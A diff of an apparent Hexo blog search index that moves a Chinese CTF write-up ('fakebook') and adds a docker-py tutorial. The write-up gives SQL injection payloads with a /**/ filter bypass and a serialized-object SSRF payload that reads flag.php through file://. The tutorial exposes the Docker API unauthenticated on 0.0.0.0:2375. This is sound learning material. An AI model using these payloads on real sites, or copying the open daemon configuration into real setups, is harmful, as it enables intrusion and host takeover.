@@ -1279,90 +1279,6 @@ print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>fakebook</title>
-    <url>/2020/09/27/fakebook/</url>
-    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
-<span id="more"></span>
-
-<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
-<p>接下来继续注入的常规操作。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
-<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
-<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
-<p><strong>爆表名</strong></p>
-<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
-<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
-<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
-<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
-<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
-<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
-<p>爆出一大堆列名。直接读取data的内容</p>
-<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
-<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
-<p>发现内容是注册时信息保存为序列化内容</p>
-<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
-<p>到这里就不知道怎么办了。。。</p>
-<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
-<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
-    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
-    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$ch</span> = curl_init();
-
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
-    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
-    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
-    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
-    &#125;
-    curl_close(<span class="hljs-variable">$ch</span>);
-
-    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
-&#125;
-&#125;</code></pre>
-<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
-<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
-<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
-
-<p>查看源码，解base64。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-        <tag>unserailize</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku代码审计</title>
     <url>/2020/09/14/decode/</url>
     <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><span id="more"></span>
@@ -1804,6 +1720,326 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </categories>
       <tags>
         <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dockerpy</title>
+    <url>/2022/05/15/dockerpy/</url>
+    <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
+<p>docker-py的地址：<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="1-安装docker-py"><a href="#1-安装docker-py" class="headerlink" title="1.安装docker-py"></a>1.安装docker-py</h3><p>​    pip安装即可，安装最新版</p>
+<pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p>
+<h3 id="2-配置docker"><a href="#2-配置docker" class="headerlink" title="2.配置docker"></a>2.配置docker</h3><p>本文使用的是Docker Desktop，docker版本是<code>20.10.12</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p>
+<h4 id="docker开启远程访问"><a href="#docker开启远程访问" class="headerlink" title="docker开启远程访问"></a>docker开启远程访问</h4><p>对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p>
+<p>对于linux中配置远程访问就稍微麻烦一点</p>
+<p><strong>方法一</strong></p>
+<p>在/usr/lib/systemd/system/docker.service，配置远程访问。</p>
+<p>主要是在[Service]这个部分，加上下面两个参数</p>
+<pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span>
+<span class="hljs-section">[Service]</span>
+ExecStart=
+<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre>
+
+<p>重启</p>
+<pre><code class="hljs undefined">systemctl daemon-reload
+systemctl restart docker</code></pre>
+
+<p><strong>方法二</strong></p>
+<p>修改<code>daemon.json</code>的配置</p>
+<pre><code class="hljs bash">vim /etc/docker/daemon.json
+
+&#123;
+  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]
+&#125;</code></pre>
+
+<blockquote>
+<p>“unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。<br>“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。</p>
+</blockquote>
+<p>修改配置以后</p>
+<p>然后让docker重新读取配置文件,并重启docker服务</p>
+<pre><code class="hljs undefined">systemctl daemon-reload
+systemctl restart docker</code></pre>
+
+<p>查看docker进程：</p>
+<pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>
+root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre>
+
+<p>Docker守护进程打开一个HTTP Socket,这样才能实现远程通信</p>
+<p>当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准</p>
+<ul>
+<li><p>查看当前版本：<a href="http://IP:2375/version">http://IP:2375/version</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p>
+</li>
+<li><p>查看所有镜像信息：<a href="http://IP:2375/images/json">http://IP:2375/images/json</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p>
+</li>
+<li><p>查看已启动容器信息：<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p>
+</li>
+<li><p>查看网卡信息： <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p>
+</li>
+</ul>
+<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="Docker-Desktop与VM冲突"><a href="#Docker-Desktop与VM冲突" class="headerlink" title="Docker Desktop与VM冲突"></a>Docker Desktop与VM冲突</h5><p>需要注意的是，安装Docker Desktop 后VM就无法使用，原因：</p>
+<blockquote>
+<p>1、Device Guard或Credential Guard与Workstation不兼容。</p>
+<p>2、Windows系统的Hyper-V不兼容导致</p>
+</blockquote>
+<p>解决方法如<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p>
+<p>开启和关闭Hyper-V</p>
+<pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype auto
+bcdedit /set hypervisorlaunchtype off</code></pre>
+
+<p>当需要使用VM时，执行关闭Hyper-V命令即可</p>
+<h5 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h5><p>settings=&gt;Dokcer engine修改配置内容</p>
+<pre><code class="hljs json">&#123;
+  <span class="hljs-attr">&quot;builder&quot;</span>: &#123;
+    <span class="hljs-attr">&quot;gc&quot;</span>: &#123;
+      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span>: <span class="hljs-string">&quot;20GB&quot;</span>,
+      <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>
+    &#125;
+  &#125;,
+  <span class="hljs-attr">&quot;experimental&quot;</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">&quot;features&quot;</span>: &#123;
+    <span class="hljs-attr">&quot;buildkit&quot;</span>: <span class="hljs-literal">true</span>
+  &#125;,
+  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [
+    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,
+    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,
+    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>
+  ]
+&#125;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p>
+<h5 id="docker配置软链接"><a href="#docker配置软链接" class="headerlink" title="docker配置软链接"></a>docker配置软链接</h5><p>由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。<a href="https://zhuanlan.zhihu.com/p/343278599">参考</a></p>
+<p>请务必先关闭docker 或者docker desktop</p>
+<ul>
+<li>通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p>
+<ul>
+<li>将.vhdx复制到想要的路径下，本文路径为：</li>
+</ul>
+<p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p>
+<ul>
+<li><p>删除源文件夹，本文是data文件夹</p>
+</li>
+<li><p>以管理员运行cmd并且使用以下命令创建链接：</p>
+<pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre>
+
+<p>请大家自行替换路径，本文路径分别为源路径：C:\Users\admin\AppData\Local\Docker\wsl\data</p>
+<p>以及想要移动的路径：D:\docker\data此时可以在源路径看到新建出来的文件夹</p>
+</li>
+</ul>
+<h2 id="使用dockerpy"><a href="#使用dockerpy" class="headerlink" title="使用dockerpy"></a>使用dockerpy</h2><p>官方给出了详细的说明文档<a href="https://docker-py.readthedocs.io/en/stable/index.html">说明文档</a>，下面只给出几个常见的操作</p>
+<h3 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h3><p>进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p>
+<h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>查看源码，可知有三个可选参数</p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string">    List images on the server.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Args:</span>
+<span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span>
+<span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span>
+<span class="hljs-string">            filtered out.</span>
+<span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span>
+<span class="hljs-string">            Available filters:</span>
+<span class="hljs-string">            - ``dangling`` (bool)</span>
+<span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Returns:</span>
+<span class="hljs-string">        (list of :py:class:`Image`): The images.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    Raises:</span>
+<span class="hljs-string">        :py:class:`docker.errors.APIError`</span>
+<span class="hljs-string">            If the server returns an error.</span>
+<span class="hljs-string">    &quot;&quot;&quot;</span>
+    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)
+    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre>
+
+<h5 id="获取所有镜像"><a href="#获取所有镜像" class="headerlink" title="获取所有镜像"></a>获取所有镜像</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
+
+client = docker.from_env()
+imagesList = client.images.<span class="hljs-built_in">list</span>()
+print(imagesList)</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p>
+<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>该函数只有一个参数name，镜像名称</p>
+<p>获取指定名称的镜像</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
+client = docker.from_env()
+mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)
+print(mysqlImage)</code></pre>
+
+<h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>与docker search 命令相同</p>
+<pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p>
+<h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>作用等同于docker pull</p>
+<pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre>
+
+<h3 id="container相关操作"><a href="#container相关操作" class="headerlink" title="container相关操作"></a>container相关操作</h3><p>容器相关的操作很多</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p>
+<h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>官方注释</p>
+<pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish
+<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.
+<span class="hljs-comment">// </span>
+<span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container
+<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span>
+<span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre>
+
+
+
+<pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
+image_name = nginx
+client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 以守护进程的方式创建容器，容器停止后不会删除</span>
+
+```
+- The port number, <span class="hljs-keyword">as</span> an integer. For example,
+``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside the
+container <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.
+- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,
+``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.
+- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify the
+host interface. For example,
+``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.
+- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host ports
+to a single container port. For example,
+``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.
+```</code></pre>
+
+<h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>获取容器对象</p>
+<pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>
+container = client.containers.get(docker_container_id)
+print(container.<span class="hljs-built_in">id</span>)
+print(container.attrs) <span class="hljs-comment"># 获取容器的详细信息</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>进入容器内部执行命令，与下面的命令作用相同</p>
+<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre>
+
+<pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> 
+port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
+image_name = nginx
+container = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  
+container.exec_run(command)</code></pre>
+
+
+
+<h3 id="network相关操作"><a href="#network相关操作" class="headerlink" title="network相关操作"></a>network相关操作</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>使用默认参数，桥接模式创建网卡</p>
+<pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre>
+
+<p>使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254</p>
+<pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(
+    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,
+    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>
+)
+ipam_config = docker.types.IPAMConfig(
+    pool_configs=[ipam_pool]
+)
+
+client.networks.create(
+    <span class="hljs-string">&quot;network1&quot;</span>,
+    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,
+    <span class="hljs-attribute">ipam</span>=ipam_config
+)</code></pre>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fakebook</title>
+    <url>/2020/09/27/fakebook/</url>
+    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
+<span id="more"></span>
+
+<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
+<p>接下来继续注入的常规操作。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
+<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
+<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
+<p><strong>爆表名</strong></p>
+<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
+<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
+<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
+<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p>爆出一大堆列名。直接读取data的内容</p>
+<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
+<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
+<p>发现内容是注册时信息保存为序列化内容</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
+<p>到这里就不知道怎么办了。。。</p>
+<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
+<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
+    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
+    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$ch</span> = curl_init();
+
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
+    &#125;
+    curl_close(<span class="hljs-variable">$ch</span>);
+
